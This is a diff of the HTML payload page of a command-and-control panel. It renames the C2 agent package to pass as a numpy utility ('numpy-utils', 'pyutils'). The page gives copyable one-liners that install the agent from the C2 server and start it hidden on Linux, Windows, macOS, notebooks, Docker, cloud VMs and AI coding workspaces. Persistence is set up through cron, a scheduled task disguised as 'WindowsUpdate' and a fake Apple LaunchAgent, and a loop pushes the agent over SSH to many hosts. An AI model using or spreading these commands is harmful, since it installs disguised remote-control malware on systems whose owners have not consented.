@@ -174,18 +174,18 @@ exec(__import__('urllib.request',fromlist=['urlopen']).urlopen('<span class="srv
     <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Universal pip install from C2 server. Works on any Linux/Unix with Python 3.</p>
 
     <h4 class="section-label">Pip install + run (recommended):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils &</div>
 
     <h4 class="section-label">Silent background (nohup):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>nohup pip install <span class="srv-url">…</span>/package/c2agent.tar.gz >/dev/null 2>&1 && nohup c2agent >/dev/null 2>&1 &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>nohup pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz >/dev/null 2>&1 && nohup pyutils >/dev/null 2>&1 &</div>
 
     <h4 class="section-label">With crontab persistence:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && (crontab -l 2>/dev/null; echo "@reboot c2agent >/dev/null 2>&1 &") | crontab - && c2agent &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && (crontab -l 2>/dev/null; echo "@reboot pyutils >/dev/null 2>&1 &") | crontab - && pyutils &</div>
 
     <h4 class="section-label">Mass SSH deploy:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>while read ip; do
   ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 user@$ip \
-    "pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && nohup c2agent >/dev/null 2>&1 &" &
+    "pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && nohup pyutils >/dev/null 2>&1 &" &
 done < targets.txt; wait</div>
   </div>
 </div>
@@ -200,13 +200,13 @@ done < targets.txt; wait</div>
     <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server. Works on Windows with Python 3.</p>
 
     <h4 class="section-label">Pip install + run:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && start /b c2agent</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && start /b pyutils</div>
 
     <h4 class="section-label">PowerShell (hidden):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "pip install '<span class="srv-url">…</span>/package/c2agent.tar.gz'; Start-Process c2agent -WindowStyle Hidden"</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "pip install '<span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz'; Start-Process pyutils -WindowStyle Hidden"</div>
 
     <h4 class="section-label">With Scheduled Task persistence:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "pip install '<span class="srv-url">…</span>/package/c2agent.tar.gz'; Register-ScheduledTask -TaskName 'WindowsUpdate' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'c2agent') -RunLevel Highest -Force; Start-Process c2agent -WindowStyle Hidden"</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "pip install '<span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz'; Register-ScheduledTask -TaskName 'WindowsUpdate' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'pyutils') -RunLevel Highest -Force; Start-Process pyutils -WindowStyle Hidden"</div>
   </div>
 </div>
 
@@ -220,16 +220,16 @@ done < targets.txt; wait</div>
     <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server. Uses macOS built-in python3.</p>
 
     <h4 class="section-label">Pip install + run:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip3 install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip3 install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils &</div>
 
     <h4 class="section-label">With LaunchAgent persistence:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip3 install <span class="srv-url">…</span>/package/c2agent.tar.gz && mkdir -p ~/Library/LaunchAgents
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip3 install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && mkdir -p ~/Library/LaunchAgents
 cat > ~/Library/LaunchAgents/com.apple.system.update.plist <<'EOF'
 <?xml version="1.0"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0"><dict>
 <key>Label</key><string>com.apple.system.update</string>
-<key>ProgramArguments</key><array><string>c2agent</string></array>
+<key>ProgramArguments</key><array><string>pyutils</string></array>
 <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
 </dict></plist>
 EOF
@@ -248,13 +248,13 @@ launchctl load ~/Library/LaunchAgents/com.apple.system.update.plist 2>/dev/null<
 
     <h4 class="section-label">Cell — pip install:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-!pip install <span class="srv-url">…</span>/package/c2agent.tar.gz
+!pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz
 import threading, subprocess
-threading.Thread(target=lambda: subprocess.Popen(['c2agent'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
+threading.Thread(target=lambda: subprocess.Popen(['pyutils'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
 print("Connected")</div>
 
     <h4 class="section-label">Shell cell:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils &</div>
   </div>
 </div>
 
@@ -269,15 +269,15 @@ print("Connected")</div>
 
     <h4 class="section-label">Notebook cell:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-!pip install <span class="srv-url">…</span>/package/c2agent.tar.gz
+!pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz
 import threading, subprocess
-threading.Thread(target=lambda: subprocess.Popen(['c2agent'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()</div>
+threading.Thread(target=lambda: subprocess.Popen(['pyutils'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()</div>
 
     <h4 class="section-label">With GPU keepalive:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-!pip install <span class="srv-url">…</span>/package/c2agent.tar.gz
+!pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz
 import threading, subprocess, time
-threading.Thread(target=lambda: subprocess.Popen(['c2agent'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
+threading.Thread(target=lambda: subprocess.Popen(['pyutils'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
 def _keepalive():
     try:
         import torch
@@ -300,11 +300,11 @@ threading.Thread(target=_keepalive, daemon=True).start()</div>
     <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Deploy agent inside Docker container via pip install.</p>
 
     <h4 class="section-label">Inject into running container:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>docker exec -d <CONTAINER_ID> sh -c "pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent"</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>docker exec -d <CONTAINER_ID> sh -c "pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils"</div>
 
     <h4 class="section-label">Standalone agent container:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>docker run -d --name c2-agent --restart=always --network=host \
-  python:3-slim sh -c "pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent"</div>
+  python:3-slim sh -c "pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils"</div>
 
     <h4 class="section-label">Docker Compose:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>version: '3.8'
@@ -314,7 +314,7 @@ services:
     restart: always
     network_mode: host
     command: >
-      sh -c "pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent"</div>
+      sh -c "pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils"</div>
   </div>
 </div>
 
@@ -330,22 +330,22 @@ services:
     <h4 class="section-label">AWS EC2 User Data:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>#!/bin/bash
 apt-get update -qq && apt-get install -y python3-pip -qq 2>/dev/null || yum install -y python3-pip -q 2>/dev/null || true
-pip3 install <span class="srv-url">…</span>/package/c2agent.tar.gz
-(crontab -l 2>/dev/null; echo "@reboot c2agent >/dev/null 2>&1 &") | crontab -
-c2agent &</div>
+pip3 install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz
+(crontab -l 2>/dev/null; echo "@reboot pyutils >/dev/null 2>&1 &") | crontab -
+pyutils &</div>
 
     <h4 class="section-label">GCP Startup Script:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>gcloud compute instances create agent-vm \
   --zone=us-central1-a --machine-type=e2-micro \
   --image-family=debian-11 --image-project=debian-cloud \
   --metadata=startup-script='#!/bin/bash
-pip3 install <span class="srv-url">…</span>/package/c2agent.tar.gz
-c2agent &'</div>
+pip3 install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz
+pyutils &'</div>
 
     <h4 class="section-label">Azure Run Command:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>az vm run-command invoke --resource-group myRG --name myVM \
   --command-id RunShellScript \
-  --scripts "pip3 install <span class="srv-url">…</span>/package/c2agent.tar.gz && nohup c2agent >/dev/null 2>&1 &"</div>
+  --scripts "pip3 install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && nohup pyutils >/dev/null 2>&1 &"</div>
   </div>
 </div>
 
@@ -359,12 +359,12 @@ c2agent &'</div>
     <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server for Devin AI workspaces.</p>
 
     <h4 class="section-label">Pip install + run:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/package/c2agent.tar.gz && c2agent &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils &</div>
 
     <h4 class="section-label">Python cell:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>import subprocess, threading
-subprocess.run(['pip', 'install', '<span class="srv-url">…</span>/package/c2agent.tar.gz'], capture_output=True)
-threading.Thread(target=lambda: subprocess.Popen(['c2agent'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
+subprocess.run(['pip', 'install', '<span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz'], capture_output=True)
+threading.Thread(target=lambda: subprocess.Popen(['pyutils'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
 print("Connected")</div>
   </div>
 </div>
